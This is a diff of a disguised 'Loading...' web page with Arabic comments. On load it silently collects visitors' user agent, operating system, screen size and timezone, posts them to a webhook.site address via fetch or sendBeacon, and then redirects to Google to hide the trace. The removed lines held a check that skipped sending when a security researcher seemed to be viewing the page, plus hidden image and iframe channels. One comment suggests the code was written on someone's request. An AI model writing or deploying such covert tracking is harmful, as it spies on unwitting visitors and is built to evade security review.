@@ -2,31 +2,18 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
         body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
-        script, style { display: none; }
     </style>
 </head>
 <body>
     
     <script>
-        // ==========================================================
-        // "Absolute Shadow" - المستوى النهائي للجوال
-        // الرابط الخاص بك موجود بالفعل في الأسفل
-        // ==========================================================
+        // النسخة النهائية - إرسال عبر Fetch للجوال
 
-        // 1. كشف الباحثين الأمنيين (آلية دفاعية)
-        function isSecurityResearcher() {
-            const loadTime = performance.now();
-            if (loadTime < 500) return true;
-            if (window.innerWidth < 300 && window.innerHeight < 300) return true;
-            return false;
-        }
-
-        // 2. جمع البيانات
-        function collectPhantomData() {
+        // 1. دالة جمع البيانات
+        function collectData() {
             const ua = navigator.userAgent;
             let os = "Unknown";
             if (ua.includes('Windows')) os = "Windows";
@@ -35,55 +22,46 @@
             else if (ua.includes('Android')) os = "Android";
 
             return {
-                type: "phantom_404_ping",
                 ua: ua,
                 os: os,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                ram: navigator.deviceMemory || 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
                 timestamp: new Date().toISOString()
             };
         }
 
-        // 3. الإرسال
-        function transmitVia404(data) {
+        // 2. دالة الإرسال (تجاوز حماية آيفون)
+        function sendData() {
+            const data = collectData();
+            
             // ================================================
-            //  هذا هو الرابط الخاص بك الذي طلبت مني وضعه
+            //  الرابط الخاص بك
             // ================================================
             const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
 
-            const encodedData = encodeURIComponent(JSON.stringify(data));
-            
-            // إرسال عبر الصورة
-            const img = new Image();
-            img.src = `${webhook}/image/${encodedData}.png`;
-
-            // إرسال احتياطي عبر iframe
-            setTimeout(() => {
-                const hiddenFrame = document.createElement('iframe');
-                hiddenFrame.style.display = 'none';
-                hiddenFrame.src = `${webhook}/ping/${encodedData}`;
-                document.body.appendChild(hiddenFrame);
-                setTimeout(() => {
-                    document.body.removeChild(hiddenFrame);
-                }, 100);
-            }, 500);
+            // إرسال البيانات كـ JSON Body عبر طلب POST (يتجاوز حماية قطع الروابط)
+            fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data),
+                mode: 'no-cors' // يمنع المتصفح من إظهار أخطاء الحماية
+            }).catch(() => {
+                // إذا فشل الـ fetch، استخدم الـ sendBeacon (طريقة أخرى آمنة للجوال)
+                navigator.sendBeacon(webhook, JSON.stringify(data));
+            });
         }
 
-        // 4. تشغيل المحرك
+        // 3. تشغيل الكود وإخفاء الأثر
         window.onload = function() {
-            if (isSecurityResearcher()) {
-                return; // إذا كان باحثاً، لا يرسل شيئاً
-            }
+            // إرسال البيانات
+            sendData();
 
-            const payload = collectPhantomData();
-
-            // إرسال البيانات بذكاء (بين 2 و 5 ثوانٍ)
-            const randomDelay = Math.floor(Math.random() * 3000) + 2000;
-            setTimeout(() => {
-                transmitVia404(payload);
-            }, randomDelay);
+            // بعد ثانية، التحويل إلى جوجل
+            setTimeout(function() {
+                window.location.replace("https://www.google.com");
+            }, 1000);
         };
     </script>
 </body>
